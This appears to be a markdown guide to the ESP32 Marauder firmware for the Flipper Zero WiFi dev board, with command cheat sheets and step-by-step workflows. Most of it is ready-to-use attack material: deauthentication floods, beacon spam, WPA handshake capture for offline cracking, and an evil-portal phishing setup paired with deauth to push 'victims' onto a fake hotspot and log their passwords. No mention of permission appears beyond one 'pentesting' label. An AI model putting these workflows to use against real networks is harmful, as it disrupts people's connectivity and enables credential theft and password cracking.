# ESP32 Marauder - Complete Guide

> Everything you need to know about Marauder on the Flipper Zero WiFi Dev Board.
> From scanning to attacking to evil portals — all commands, settings, and workflows.

```
    ___  ___                          _           
    |  \/  |                         | |          
    | .  . | __ _ _ __ __ _ _   _  __| | ___ _ __ 
    | |\/| |/ _` | '__/ _` | | | |/ _` |/ _ \ '__|
    | |  | | (_| | | | (_| | |_| | (_| |  __/ |   
    \_|  |_/\__,_|_|  \__,_|\__,_|\__,_|\___|_|   
```

---

## Table of Contents

1. [Quick Reference](#-quick-reference)
2. [Scanning Commands](#-scanning--sniffing)
3. [Target Management](#-target-management)
4. [Attack Commands](#-attacks)
5. [Evil Portal](#-evil-portal)
6. [Bluetooth / AirTag](#-bluetooth--airtag)
7. [Settings](#%EF%B8%8F-settings)
8. [Workflows (Step-by-Step)](#-workflows)
9. [Tips & Tricks](#-tips--tricks)

---

## 🔍 Quick Reference

```
┌──────────────────────────────────────────────────────────────┐
│                    MARAUDER CHEAT SHEET                       │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  SCANNING                        ATTACKS                     │
│  ─────────                       ────────                    │
│  scanap         Scan APs         attack -t deauth     Flood  │
│  scansta        Scan clients     attack -t deauth -c  Target │
│  sniffbeacon    Sniff beacons    attack -t beacon -l  SSID   │
│  sniffdeauth    Detect deauths   attack -t beacon -r  Random │
│  sniffpmkid     Capture PMKID    attack -t beacon -a  Clone  │
│  sigmon         Signal strength  attack -t probe      Probe  │
│  stopscan       Stop anything    attack -t rickroll   ;)     │
│                                                              │
│  TARGETS                         EVIL PORTAL                 │
│  ────────                        ───────────                 │
│  list -a        Show APs         evilportal -c start  Launch │
│  list -c        Show clients     evilportal -c start -w X    │
│  list -s        Show SSIDs       evilportal -c sethtml X     │
│  list -t        Show AirTags     evilportal -c setap N       │
│  select -a N    Select AP        stopscan             Stop   │
│  select -c N    Select client                                │
│  select -a all  Select all       BLUETOOTH                   │
│  ssid -a -n X   Add SSID         ──────────                  │
│  ssid -a -g N   Generate SSIDs   sniffat       Sniff AirTags │
│  ssid -r N      Remove SSID      spoofat -t N  Spoof AirTag │
│  channel -s N   Set channel                                  │
│                                                              │
│  ADMIN                                                       │
│  ──────                                                      │
│  settings                   Show all settings                │
│  settings -s X enable       Enable a setting                 │
│  settings -r                Reset to defaults                │
│  reboot                     Reboot Marauder                  │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

---

## 📡 Scanning & Sniffing

### `scanap` — Scan for Access Points

Discovers all WiFi networks in range. This is usually your **first step** before any attack.

```
scanap
```

- Scans all channels for nearby APs
- Results saved internally — view with `list -a`
- Stop with `stopscan`

### `scansta` — Scan for Stations (Clients)

Finds devices (phones, laptops, etc.) connected to APs. **Requires `scanap` first** — it only finds clients on APs already in your list.

```
scansta
```

- View results with `list -c`
- Stop with `stopscan`

### `sniffbeacon` — Sniff Beacon Frames

Passively captures beacon frames (the "hey I'm here" packets APs broadcast). Shows SSID, channel, encryption type.

```
sniffbeacon
```

- Auto-hops channels
- Great for passive recon
- Stop with `stopscan`

### `sniffdeauth` — Detect Deauth Attacks

Monitors for deauthentication frames in the air. Useful to **detect if someone else is attacking** a network.

```
sniffdeauth
```

- Auto-hops channels
- Alerts when deauth frames detected
- Stop with `stopscan`

### `sniffpmkid` — Capture WPA Handshakes / PMKID

Captures PMKID and EAPOL handshake frames used in WPA authentication. This is what you need to **crack WiFi passwords offline**.

```
sniffpmkid [-c <channel>] [-d] [-l]
```

| Flag | Description |
|------|-------------|
| `-c <channel>` | Start on specific channel |
| `-d` | **Send deauth frames** to force devices to reconnect (triggers handshakes!) |
| `-l` | Only target selected APs, auto-hop channels (1/sec) |

**Best combo:** `sniffpmkid -d -l` — deauths selected targets and captures their handshakes automatically.

- Captured data saved as PCAP files on SD card (if `SavePCAP` is enabled)
- Stop with `stopscan`

### `sigmon` — Signal Monitor

Real-time signal strength monitor for selected APs. Useful for **physically locating** an access point.

```
sigmon
```

- Select APs first with `select -a`
- Stop with `stopscan`

---

## 🎯 Target Management

### `list` — View Scanned Items

```
list -a          # List access points
list -c          # List stations (clients)
list -s          # List SSIDs (for beacon spam)
list -t          # List sniffed AirTags
```

Selected items show `(selected)` — these are your targets for attacks.

### `select` — Select / Deselect Targets

Toggle selection on APs, clients, or SSIDs. **Toggles** — run again to deselect.

```
select -a 0,1,3       # Select APs at indices 0, 1, 3
select -a all          # Select ALL APs
select -c 2,5          # Select clients at indices 2 and 5
select -s 0            # Select SSID at index 0
```

**Filter by name:**
```
select -a -f "equals 'MyWiFi'"           # Exact match
select -a -f "contains Free"             # Partial match
select -a -f "equals 'A' or contains B"  # Combined
```

### `ssid` — Manage SSID List

Create SSIDs for beacon spam attacks.

```
ssid -a -n "Free_WiFi"     # Add a named SSID
ssid -a -g 10              # Generate 10 random SSIDs
ssid -r 3                  # Remove SSID at index 3
```

View with `list -s`.

### `channel` — Get/Set WiFi Channel

```
channel            # Show current channel
channel -s 6       # Switch to channel 6
channel -s 11      # Switch to channel 11
```

### `clearlist` — Clear Scan Results

Clears the AP/station/SSID lists.

### `stopscan` — Stop Everything

```
stopscan           # Stop current scan/attack
stopscan -f        # Force stop + disconnect from any WLANs
```

---

## ⚔️ Attacks

### `attack -t deauth` — Deauthentication Attack

Kicks devices off their WiFi network by sending fake "disconnect" frames. **The bread and butter of WiFi attacks.**

**3 modes:**

#### Flood (all clients on selected APs)
```
scanap → stopscan → list -a → select -a 0,1 → attack -t deauth
```
Broadcasts deauth to ALL clients on the selected APs.

#### Targeted (specific clients only)
```
scanap → stopscan → scansta → stopscan → select -a 0 → select -c 2,5 → attack -t deauth -c
```
Only deauths selected clients on selected APs.

#### Manual (no scanning needed)
```
attack -t deauth -s AA:BB:CC:DD:EE:FF -d 11:22:33:44:55:66
```
Directly specify source (AP) and destination (client) MACs.

### `attack -t beacon` — Beacon Spam

Floods the airwaves with fake WiFi networks. Makes nearby devices see tons of fake SSIDs.

**3 modes:**

```
attack -t beacon -l      # Spam from your SSID list
attack -t beacon -r      # Spam random generated SSIDs (infinite)
attack -t beacon -a      # Clone real APs (from scanap results)
```

#### List spam (custom names)
```
ssid -a -n "Free Airport WiFi"
ssid -a -n "Starbucks WiFi"
ssid -a -n "FBI Surveillance Van"
attack -t beacon -l
```

#### Random spam
```
attack -t beacon -r       # Instant chaos, no setup needed
```

#### Clone spam (copy real APs)
```
scanap → stopscan → select -a 0,1,2 → attack -t beacon -a
```
Creates duplicates of real nearby networks — confusing!

### `attack -t probe` — Probe Request Flood

Floods probe requests to selected APs. Can overwhelm APs or trigger responses.

```
scanap → stopscan → select -a 0 → attack -t probe
```

### `attack -t rickroll` — Rickroll

Spam beacon frames with Rick Astley lyrics as SSIDs. Because why not.

```
attack -t rickroll
```

### Other Attack Types

| Type | Description |
|------|-------------|
| `attack -t badmsg` | Bad message attack |
| `attack -t sleep` | Association sleep attack — puts clients to sleep |
| `attack -t sae` | SAE commit flood — targets WPA3 |
| `attack -t csa` | Channel Switch Announcement — tricks APs into switching channels |
| `attack -t quiet` | Quiet time — tells clients to stop transmitting |

---

## 🚪 Evil Portal

Creates a fake WiFi hotspot with a captive portal login page. When anyone connects and opens a browser, they see your fake page and enter credentials.

### Commands

```
evilportal -c start                    # Start with default index.html
evilportal -c start -w Google.html     # Start with specific HTML file
evilportal -c sethtml MyPortal.html    # Set the active HTML file
evilportal -c setap 3                  # Set AP name from AP list index
```

### Setup Requirements

| What | Where | How |
|------|-------|-----|
| Portal HTML | `/ext/index.html` (SD root) | Rename your HTML to `index.html` |
| AP Name | `/ext/ap.config.txt` (SD root) | Put just the name, e.g. `Free_WiFi` |
| Extra HTMLs | SD root | Any `.html` file, select with `-w` flag |

### AP Name Priority (Marauder checks in this order)

1. `ap.config.txt` on SD card
2. First "selected" AP from `scanap` results
3. First SSID from the `ssid` list

### Evil Portal + Deauth Combo

The ultimate setup — deauth clients from the real AP while your evil portal runs:

1. `settings -s EPDeauth enable` — turn on the combo mode
2. `scanap` → `stopscan` → `select -a 0` — select the real AP
3. `evilportal -c start` — launch portal

Now Marauder will:
- Run your evil portal as a fake AP
- Simultaneously deauth clients from the REAL AP
- Clients get kicked off real WiFi → see your fake AP → connect → enter creds

**Pro tip for dual-band:** Select BOTH the 2.4GHz and 5GHz APs of a network to deauth clients on both bands.

### Captured Credentials

Logged to `evil_portal_x.log` on SD card. Contains usernames and passwords entered by victims.

---

## 📱 Bluetooth / AirTag

### `sniffat` — Sniff AirTags

Captures BLE advertisements from nearby Apple AirTags.

```
sniffat
```

View captured AirTags with `list -t`.

### `spoofat` — Spoof an AirTag

Replays/spoofs a captured AirTag's BLE advertisement.

```
spoofat -t 0        # Spoof AirTag at index 0
```

---

## ⚙️ Settings

View and change Marauder behavior.

```
settings                              # Show all current settings
settings -s <name> enable             # Enable a setting
settings -s <name> disable            # Disable a setting
settings -r                           # Reset everything to defaults
```

### Available Settings

| Setting | Default | What it does |
|---------|---------|-------------|
| `ForcePMKID` | `false` | Send deauth frames during `sniffpmkid` to force handshakes |
| `ForceProbe` | `false` | Send deauth frames during `sniffprobe` |
| `SavePCAP` | `true` | Save captured WiFi data to `.pcap` files on SD card |
| `EnableLED` | `true` | Enable/disable the status LED |
| `EPDeauth` | `false` | **Deauth selected APs while Evil Portal runs** (the evil combo!) |
| `ChanHop` | `false` | Auto-hop channels during sniffing |

### Recommended Settings for Pentesting

```
settings -s SavePCAP enable        # Always save captures
settings -s EPDeauth enable        # Enable deauth+portal combo
settings -s ForcePMKID enable      # Aggressive PMKID capture
```

---

## 📋 Workflows

Step-by-step guides for common scenarios.

### 🟢 Beginner: "What's around me?" (Passive Recon)

Just look around without touching anything.

```
1. scanap                    # Find all WiFi networks
2. stopscan                  # Stop after a few seconds
3. list -a                   # See what's out there
4. sniffbeacon               # Watch beacon traffic
5. stopscan
6. sniffdeauth               # Check if anyone is attacking
7. stopscan
```

### 🟡 Intermediate: Deauth Attack

Kick everyone off a WiFi network.

```
1. scanap                    # Scan for APs
2. stopscan                  # Stop scanning
3. list -a                   # Show found APs
4. select -a 0               # Select your target (index 0)
5. list -a                   # Verify it shows (selected)
6. attack -t deauth          # FIRE! All clients get kicked
7. stopscan                  # Stop when done
```

### 🟡 Intermediate: Targeted Deauth (one specific device)

Only kick ONE device off.

```
1. scanap                    # Scan APs
2. stopscan
3. list -a
4. select -a 0               # Select the AP
5. scansta                   # Scan for clients on that AP
6. stopscan
7. list -c                   # Show clients
8. select -c 2               # Select specific client (index 2)
9. attack -t deauth -c       # Only deauth that one client
10. stopscan
```

### 🟡 Intermediate: Beacon Spam (flood fake networks)

Make everyone's WiFi list go crazy.

```
1. ssid -a -n "Free Airport WiFi"
2. ssid -a -n "FBI Surveillance Van"
3. ssid -a -n "Pretty Fly for a WiFi"
4. ssid -a -n "It Hurts When IP"
5. ssid -a -g 20             # Add 20 random ones too
6. list -s                   # Check your list
7. attack -t beacon -l       # SPAM!
8. stopscan                  # Stop
```

### 🔴 Advanced: PMKID Capture (grab WPA handshakes)

Capture WPA handshakes to crack passwords offline.

```
1. scanap                    # Scan for APs
2. stopscan
3. list -a                   # Find your target
4. select -a 0               # Select it
5. sniffpmkid -d -l          # Deauth + capture PMKID
                              # -d = send deauths (force reconnect)
                              # -l = only target selected APs
6. stopscan                  # Stop when you see captures
```

PCAP files saved on SD card → crack with `hashcat` or `aircrack-ng` on your PC.

### 🔴 Advanced: Evil Portal (credential harvesting)

The full phishing setup.

```
1. Make sure index.html + ap.config.txt are on SD root
2. evilportal -c start       # Launch!
   (or: evilportal -c start -w Google_Modern.html)
3. Wait for victims to connect and enter creds
4. Creds appear in serial output
5. stopscan                  # Stop
```

### 🔴 Advanced: Evil Portal + Deauth Combo

The most effective setup — force people onto your portal.

```
1. settings -s EPDeauth enable    # Enable combo mode
2. scanap                         # Find the real AP
3. stopscan
4. list -a
5. select -a 0                    # Select the AP to clone/attack
6. evilportal -c start            # Launch portal
   → Marauder now deauths the real AP
   → Kicked clients see your fake AP
   → They connect and enter credentials
7. stopscan                       # Stop everything
```

### 🟢 Fun: Rickroll

```
attack -t rickroll
```
Spams WiFi names with Rick Astley lyrics. Legendary.

### 🟢 Fun: Clone Nearby Networks

```
1. scanap
2. stopscan
3. select -a all              # Select everything
4. attack -t beacon -a        # Clone them all
```
Everyone's WiFi list now shows duplicates of every network. Chaos!

### 🔵 Defense: AirTag Tracking Detection

```
1. sniffat                    # Sniff for AirTags
2. list -t                    # See what's following you
3. spoofat -t 0               # Spoof one to test/confuse
```

---

## 💡 Tips & Tricks

### General
- **Always `stopscan` before starting something new** — Marauder can only run one scan/attack at a time
- **`scanap` is always step 1** for any targeted attack
- **Indices start at 0** — the first item in any list is index 0
- **Selections toggle** — running `select -a 0` twice will select then deselect

### Evil Portal
- **HTML files must be under 20KB** — Marauder won't load bigger files
- **All resources must be inline** — no external CSS/JS/images (use inline SVGs)
- **Form action must be `/get`** — `<form method="POST" action="/get">`
- **Input names must be `email` and `password`** — that's what Marauder captures
- **Creds logged to** `evil_portal_x.log` on SD card
- **Use `-w` to switch portals** without stopping: `evilportal -c start -w Facebook.html`

### Deauth
- ESP32 can only deauth on **2.4GHz** — 5GHz is out of range for the chip
- Deauth attacks are **detectable** — the target network can see them
- Some modern devices have **802.11w (PMF)** which blocks deauth attacks

### PMKID
- **`-d -l` combo is key** — deauth forces reconnect, `-l` targets only selected APs
- PCAP files on SD → transfer to PC → crack with `hashcat -m 22000` or `aircrack-ng`
- **WPA3/SAE** networks are resistant to PMKID attacks

### Performance
- The Flipper Zero WiFi Dev Board has an **ESP32-S2** (single core, no BT)
- Range is limited — **~10-30 meters** depending on environment
- **Channel hopping** (`ChanHop` setting) trades focus for coverage

---

## 🔗 Resources

- [ESP32 Marauder Wiki](https://github.com/justcallmekoko/ESP32Marauder/wiki)
- [Marauder Companion App](https://lab.flipper.net/apps/esp32_wifi_marauder)
- [Portal Templates](https://github.com/L-ubu/flipper-portals)
- [FZEE Web Flasher](https://fzeeflasher.com) (for firmware updates)
